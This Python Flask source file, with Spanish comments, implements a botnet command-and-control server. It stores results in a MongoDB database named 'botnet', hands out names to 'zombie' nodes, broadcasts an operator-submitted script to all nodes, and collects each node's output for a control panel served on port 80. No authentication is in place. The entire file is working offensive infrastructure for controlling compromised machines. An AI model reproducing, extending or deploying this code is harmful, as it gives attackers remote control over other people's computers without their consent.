"""
librerias addicionales:

    - flask
    - flask_httpauth
    - pymongo

API Rest

    -- /
        -- /panel
        -- /output_detail/<cmd_id>
        -- /clear
        -- /command
        -- /add_zombie
        -- /broadcast
        -- /push_output
        -- /logout
"""

import time
import random

from pymongo import MongoClient
from flask import Flask, request, render_template, url_for, redirect

mongo = MongoClient("mongodb://localhost:27017/")

app = Flask(__name__, template_folder='_templates')

db = mongo.botnet

broadcasting = 'ping'


@app.route('/logout')
def logout():
    return "Sesion terminada"

@app.route('/push_output', methods=['POST'])
def push_output():
    node_id = request.form.get('node_id')
    result = request.form.get('result')
    command = request.form.get('command')

    if not node_id or not result or not command:
        return "?", 400

    results = {
        "node_id": node_id,
        "result": result,
        "command": command
    }

    db.commands_results.insert_one(results)
    return "Resultado almacenado"

@app.route('/broadcast')
def broadcast():
    global broadcasting
    return broadcasting

@app.route('/add_zombie')
def add_zombie():
    id_corpus = "aeiouAEIOU4567890"
    name_corpus = [
        "rem", "ram", "akame", "lucy", "yuki", "asuna", "haruka", "yukino", "sinon",
        "megumi", "2B", "erina"
    ]

    numerical_id = random.choice(id_corpus)
    name_id = random.choice(name_corpus)

    return "%s_%s" % (name_id, numerical_id)

@app.route('/command', methods=['POST'])
def command():
    global broadcasting
    cmd = request.form.get('script')

    if not cmd:
        return "?", 400

    broadcasting = cmd

    return redirect(url_for('panel'))

@app.route('/clear')
def clear():
    global broadcasting
    db.commands_results.drop()
    broadcasting = "ping"

    return redirect(url_for('panel'))

@app.route('/output_detail/<cmd_id>')
def output_detail(cmd_id):
    return "aqui veremos la salida del comando"

@app.route('/panel')
def panel():
    global broadcasting
    commands_results = db.commands_results.find()
    return render_template("panel.html", broadcast=broadcasting, commands=commands_results)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port='80')
